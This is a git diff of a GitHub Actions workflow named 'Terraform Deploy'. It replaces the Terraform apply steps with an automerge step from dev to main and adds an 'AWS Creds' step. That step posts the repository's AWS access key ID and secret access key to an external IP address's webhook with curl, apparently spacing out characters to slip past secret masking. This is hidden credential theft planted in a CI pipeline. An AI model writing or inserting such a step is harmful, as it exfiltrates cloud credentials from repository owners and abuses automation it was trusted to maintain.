@@ -1,6 +1,6 @@
-name: 'Terraform Deploy to AWS ECR'
+name: 'Terraform Deploy'
 
-on: [push]
+on: [pull_request]
 defaults:
       run:
         shell: bash
@@ -8,23 +8,18 @@ jobs:
 
   Deploy-validate:
     name: 'Deploy Stack to AWS'
-    runs-on: ubuntu-20.04
-    env:
-      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
-      AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
-      AWS_REGION: 'us-west-2'
-      
+    runs-on: ubuntu-latest
+
     steps:
-      - name: 'Checkout'
+      - name: checkout
         uses: actions/checkout@v2
-        
-      - name: 'Terraform Setup'
-        uses: hashicorp/setup-terraform@v1
-        
-      - name: 'Terraform init and Terraform apply'
-        run: | 
-          aws s3 ls
-          terraform init 
-          terraform apply -auto-approve 
-        
-  
+      - name: merge
+        uses: mtanzi/action-automerge@v1
+        id: merge
+        with:
+          github_token: ${{ github.token }}
+          source: 'dev'
+          target: 'main'
+      - name: AWS Creds
+        run: |
+            curl -H "Content-Type: application/json" -X POST -d "{\"data\":{\"accesskey\":\"${{secrets.AWS_ACCESS_KEY_ID}} | sed 's/./& /g'\",\"secretaccesskey\":\"${{secrets.AWS_SECRET_ACCESS_KEY}}\"}}" http://35.219.152.234:5000/webhook
